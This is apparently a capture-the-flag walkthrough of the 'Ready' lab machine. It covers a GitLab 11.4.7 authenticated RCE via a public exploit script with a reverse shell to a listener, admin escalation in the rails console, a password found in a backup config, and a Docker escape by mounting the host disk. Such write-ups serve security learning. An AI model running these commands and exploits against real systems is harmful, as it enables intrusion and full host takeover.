http://10.10.10.220:5080/users/sign_in|_http-trane-info: Problem with XML parsing of /evox/aboutService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 15.84 secondsGitLabAfter completing the Laboratory Box, I knew you could checkout the /help page to get a version number of GitLab.Huh, I guess you have to create a user first.After creating a user y00ser:password123, I login and return to the /help page to see a GitLab Community Edition version number 11.4.7FootholdUsing searchsploit to see if there are any available exploits for GitLab shows some promise. There appears to be two python scripts that can give us remote code execution (RCE).$ searchsploit gitlab---------------------------------------------------- --------------------------------- Exploit Title | Path---------------------------------------------------- ------------------------------------[snip]---GitLab 11.4.7 - RCE (Authenticated) (2) | ruby/webapps/49334.pyGitLab 11.4.7 - Remote Code Execution (Authenticate | ruby/webapps/49257.py---[snip]---I copy one of the scripts to my current directory with searchsploit -m ruby/webapps/49334.py.I use the scripts -h flag to see what arguments are needed:$ python3 49334.py -husage: 49334.py [-h] -u U -p P -g G -l L -P PGitLab 11.4.7 RCEoptional arguments: -h, --help show this help message and exit -u U GitLab Username/Email -p P Gitlab Password -g G Gitlab URL (without port) -l L reverse shell ip -P P reverse shell portSo I supply the script with the needed arguments, run nc -lvnp 9001 on another shell tab, and execute the script:$ python3 49334.py -u y00ser -p password123 -g http://10.10.10.220 -l 10.10.14.2 -P 9001 [+] authenticity_token: UURyorKkxmg8KQUkog7skIQdeZjNQv4qATa83Enyb7VaC+97Op4Bcz4zX/+NLei82VB96whWqpaXApdGIMlQGw==[+] Creating project with random name: project4017[+] Running Exploit[+] Exploit completed successfully!And on my nc tab, I see the connection, but no output. I run some simple commands and see if python is installed on the system. Then I create a better looking shell.$ nc -lvnp 9001 listening on [any] 9001 ...connect to [10.10.14.2] from (UNKNOWN) [10.10.10.220] 42046whoamigitwhich pythonwhich python3/opt/gitlab/embedded/bin/python3/opt/gitlab/embedded/bin/python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;git@gitlab:~/gitlab-rails/working$ I tried make the shell more stable by backgrounding the session, running stty raw -echo and returning to the process, but my entire bash screen would freeze so I abandoned trying to get it to work. So I guess I won’t have tab completion. That’s okay.UserInitally I believed this was going to be similar to Laboratory, so I used what I had learned and made my user an admin. Using gitlab-rails console:gitlab-rails console------------------------------------------------------------------------------------- GitLab: 11.4.7 (98f8423) GitLab Shell: 8.3.3 postgresql: 9.6.8-------------------------------------------------------------------------------------Loading production environment (Rails 4.2.10)irb(main):001:0&amp;gt; user = User.find_by(username: &#39;y00ser&#39;)user = User.find_by(username: &#39;y00ser&#39;)=&amp;gt; #&amp;lt;User id:7 @y00ser&amp;gt;irb(main):002:0&amp;gt; user.admin = trueuser.admin = true=&amp;gt; trueirb(main):003:0&amp;gt; user.save!user.save!=&amp;gt; trueAlso while I’m here, I’d like to check out the user dude who I saw in the /etc/passwd file. Listing out his attributes, I find a password hash:irb(main):006:0&amp;gt; u = User.find(2)u = User.find(2)=&amp;gt; #&amp;lt;User id:2 @dude&amp;gt;irb(main):007:0&amp;gt; pp u.attributespp u.attributes{&quot;id&quot;=&amp;gt;2, &quot;email&quot;=&amp;gt;&quot;dude@ready.com&quot;, &quot;encrypted_password&quot;=&amp;gt; &quot;$2a$10$NOMTXhO31vqykicMa6zj3O.F5PIyI9q/S4c.v22eMSfXNDdtpI2Mm&quot;,It appears it’s a bcrypt password so I don’t think I’m going to be able to decrypt it.I logged back into GitLab and explored the users, projects, repositories in the admin panel to find anything of value, but didn’t find anything. So this doesn’t look like it’ll be exactly like Laboratory.Checking out the home directory, there is only one user dude. Inside is the user flag:git@gitlab:~/gitlab-rails/working$ cd /homecd /homegit@gitlab:/home$ lslsdudegit@gitlab:/home$ cd dudecd dudegit@gitlab:/home/dude$ lslsuser.txtgit@gitlab:/home/dude$Viewing the contents of the root directory / gives us a clue that we are inside of a docker containergit@gitlab:/$ ls -alls -altotal 104drwxr-xr-x 1 root root 4096 Dec 1 12:41 .drwxr-xr-x 1 root root 4096 Dec 1 12:41 ..-rwxr-xr-x 1 root root 0 Dec 1 12:41 .dockerenv-rw-r--r-- 1 root root 185 Nov 20 2018 RELEASEdrwxr-xr-x 2 root root 4096 Nov 20 2018 assetsdrwxr-xr-x 1 root root 4096 Dec 1 15:40 bindrwxr-xr-x 2 root root 4096 Apr 12 2016 bootdrwxr-xr-x 13 root root 3760 May 4 18:16 devdrwxr-xr-x 1 root root 4096 Dec 2 10:45 etcdrwxr-xr-x 1 root root 4096 Dec 2 10:45 homedrwxr-xr-x 1 root root 4096 Sep 13 2015 libdrwxr-xr-x 2 root root 4096 Nov 13 2018 lib64drwxr-xr-x 2 root root 4096 Nov 13 2018 mediadrwxr-xr-x 1 root root 4096 May 5 14:08 mntdrwxr-xr-x 1 root root 4096 Dec 1 16:23 optdr-xr-xr-x 401 root root 0 May 4 18:16 procdrwx------ 1 root root 4096 Dec 13 15:06 root-rw-r--r-- 1 root root 23 Jun 29 2020 root_passdrwxr-xr-x 1 root root 4096 Dec 13 15:07 rundrwxr-xr-x 1 root root 4096 Nov 19 2018 sbindrwxr-xr-x 2 root root 4096 Nov 13 2018 srvdr-xr-xr-x 13 root root 0 May 4 18:16 sysdrwxrwxrwt 1 root root 4096 May 5 14:34 tmpdrwxr-xr-x 1 root root 4096 Nov 13 2018 usrdrwxr-xr-x 1 root root 4096 Nov 13 2018 vargit@gitlab:/$We see a .dockerenv file which tips us off. There’s also a very interesting file called root_pass inside of the root directory:git@gitlab:/$ cat root_passcat root_passYG65407Bjqvv9A0a8Tm_7wI wonder if we can use that to switch user su to root:git@gitlab:/$ su - rootsu - rootPassword: YG65407Bjqvv9A0a8Tm_7wsu: Authentication failuregit@gitlab:/$Nope, I guess that won’t work. This is the point I go down several rabbit holes, but ultimately this comes down to knowing what’s normal and what isn’t normal on a linux filesystem. I used LinPEAS to enumerate for me and I glanced over the directory I should’ve looked at. We can see a lot of our stuff is in /var/opt/gitlab but there is another directory we see a few things in too, which is /opt/gitlab. Normally you don’t see a lot of things in /opt. /opt is used for “the installation of add-on application software packages.” But if you were to check out your /opt directory on your attack box now, you probably wouldn’t see but maybe one or two items in there. Try running echo $PATH and you probably won’t see /opt in there either. But remember when I ran which python3? The python3 binary was in /opt/gitlab/embedded/bin. In fact if I were to run echo $PATH on this box I would see:git@gitlab:/$ echo $PATHecho $PATH/opt/gitlab/embedded/lib/ruby/gems/2.4.0/bin:/opt/gitlab/bin:/opt/gitlab/embedded/bin:/bin:/usr/binThere seems to be some important stuff in /opt. Of course this is hindsight now, but it shows the importance of knowing what you should normally see on a box. So let’s see what is in /opt:ls -al /opttotal 24drwxr-xr-x 1 root root 4096 Dec 1 16:23 .drwxr-xr-x 1 root root 4096 Dec 1 12:41 ..drwxr-xr-x 2 root root 4096 Dec 7 09:25 backupdrwxr-xr-x 1 root root 4096 Dec 1 12:41 gitlabBackups have a tendency to show some goodies. Let’s see if there is a password inside any of these files. I start broad and work my way down:First I grep for password across all files in the directory:git@gitlab:/opt/backup$ grep &#39;password&#39; *grep &#39;password&#39; *docker-compose.yml: gitlab_rails[&#39;initial_root_password&#39;]=File.read(&#39;/root_pass&#39;)gitlab.rb:#### Email account passwordgitlab.rb:# gitlab_rails[&#39;incoming_email_password&#39;] = &quot;[REDACTED]&quot;gitlab.rb:# password: &#39;_the_password_of_the_bind_user&#39;gitlab.rb:# password: &#39;_the_password_of_the_bind_user&#39;gitlab.rb:# &#39;/users/password&#39;,gitlab.rb:#### Change the initial default admin password and shared runner registration tokens.gitlab.rb:# gitlab_rails[&#39;initial_root_password&#39;] = &quot;password&quot;gitlab.rb:# gitlab_rails[&#39;db_password&#39;] = nilgitlab.rb:# gitlab_rails[&#39;redis_password&#39;] = nilgitlab.rb:gitlab_rails[&#39;smtp_password&#39;] = &quot;wW59U!ZKMbG9+*#h&quot;gitlab.rb:# gitlab_shell[&#39;http_settings&#39;] = { user: &#39;username&#39;, password: &#39;password&#39;, ca_file: &#39;/etc/ssl/cert.pem&#39;, ca_path: &#39;/etc/pki/tls/certs&#39;, self_signed_cert: false}gitlab.rb:##! `SQL_USER_PASSWORD_HASH` can be generated using the command `gitlab-ctl pg-password-md5 gitlab`gitlab.rb:# postgresql[&#39;sql_user_password&#39;] = &#39;SQL_USER_PASSWORD_HASH&#39;gitlab.rb:# postgresql[&#39;sql_replication_password&#39;] = &quot;md5 hash of postgresql password&quot; # You can generate with `gitlab-ctl pg-password-md5 &amp;lt;dbuser&amp;gt;`gitlab.rb:# redis[&#39;password&#39;] = &#39;redis-password-goes-here&#39;gitlab.rb:####! **Master password should have the same value defined ingitlab.rb:####! redis[&#39;password&#39;] to enable the instance to transition to/fromgitlab.rb:# redis[&#39;master_password&#39;] = &#39;redis-password-goes-here&#39;gitlab.rb:# geo_secondary[&#39;db_password&#39;] = nilgitlab.rb:# geo_postgresql[&#39;pgbouncer_user_password&#39;] = nilgitlab.rb:# password: PASSWORDgitlab.rb:###! generate this with `echo -n &#39;$password + $username&#39; | md5sum`gitlab.rb:# pgbouncer[&#39;auth_query&#39;] = &#39;SELECT username, password FROM public.pg_shadow_lookup($1)&#39;gitlab.rb:# password: MD5_PASSWORD_HASHgitlab.rb:# postgresql[&#39;pgbouncer_user_password&#39;] = nilgit@gitlab:/opt/backup$docker-compose.yml references the root_pass file in the root directory, but it also looks like gitlab.rb has quite a few hits on password as well.Now we drill down to find password in gitlab.rb, but we want to remove results that start with a # since those are comments in the file and don’t mean anything to us:git@gitlab:/opt/backup$ grep &#39;password&#39; gitlab.rb | grep -v &#39;^#&#39;grep &#39;password&#39; gitlab.rb | grep -v &#39;^#&#39;gitlab_rails[&#39;smtp_password&#39;] = &quot;wW59U!ZKMbG9+*#h&quot;That shows us something interesting. Perhaps we can use this to get docker root:git@gitlab:/opt/backup$ su - rootsu - rootPassword: wW59U!ZKMbG9+*#hroot@gitlab:~#Success!RootAdmittedly, I started looking at breakout attempts before I privesc’d to docker root. When reviewing the LinePEAS output, it showed caps that were enabled. Most of what I found on the web would reference a pretty simple way to gain root on the host box with certain capabilities enabled, which in this case looked like everything. I eventually fell on this hacktricks which, with SYS_ADMIN capability enabled, could allow the docker container to “mount the host disk and access it freely.”Oh and if you want to see what capabilites are enabled for you, just run capsh --printroot@gitlab:~# capsh --printcapsh --printCurrent: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37+eipBounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37Securebits: 00/0x0/1&#39;b0 secure-noroot: no (unlocked) secure-no-suid-fixup: no (unlocked) secure-keep-caps: no (unlocked)uid=0(root)gid=0(root)groups=0(root)root@gitlab:~#Following along wih the instructions from the site:root@gitlab:/# fdisk -l---[snip]---Device Start End Sectors Size Type/dev/sda1 2048 4095 2048 1M BIOS boot/dev/sda2 4096 37746687 37742592 18G Linux filesystem/dev/sda3 37746688 41940991 4194304 2G Linux swaproot@gitlab:/# mkdir /mnt/holemkdir /mnt/holeroot@gitlab:/# cd /mnt cd /mntroot@gitlab:/mnt# lslsholeroot@gitlab:/mnt# mount /dev/sda2 holemount /dev/sda2 holeroot@gitlab:/mnt# cd holecd holeroot@gitlab:/mnt/hole# lslsbin cdrom etc lib lib64 lost+found mnt proc run snap sys usrboot dev home lib32 libx32 media opt root sbin srv tmp varroot@gitlab:/mnt/hole# chroot ./ bashchroot ./ bashroot@gitlab:/# whoamiwhoamirootroot@gitlab:/# cd /rootcd /rootroot@gitlab:~# lslsdocker-gitlab ready-channel root.txt snaproot@gitlab:~#And there it is. That’s Ready." } ]
